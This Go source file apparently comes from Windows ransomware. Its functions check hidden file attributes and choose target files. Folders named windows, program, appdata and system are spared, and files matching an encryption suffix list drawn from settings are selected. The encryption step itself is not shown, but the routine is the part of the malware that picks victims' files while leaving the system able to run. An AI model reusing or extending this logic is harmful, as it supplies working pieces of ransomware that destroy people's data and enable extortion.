// +build windows

package main

import (
	"golang.org/x/sys/windows"
	"strings"
)

func isHidden(path string) bool {
	p, e := windows.UTF16PtrFromString(path)
	if e != nil {
		return false
	}
	attrs, e := windows.GetFileAttributes(p)
	if e != nil {
		return false
	}
	return attrs&windows.FILE_ATTRIBUTE_HIDDEN != 0
}

func filter(path string) int8 {
	lowPath := strings.ToLower(path)

	innerList := []string{"windows", "program", "appdata", "system"}
	suffixList := settings.EncSuffixList

	for _, inner := range innerList {
		if strings.Contains(lowPath, inner) {
			return 0
		}
	}
	for _, suffix := range suffixList {
		if strings.HasSuffix(lowPath, suffix) {
			return 1
		}
	}
	return 2
}

func fileFilter(path string) int8 {
	if settings.SkipHidden && isHidden(path) {
		return 2
	}
	return filter(path)
}
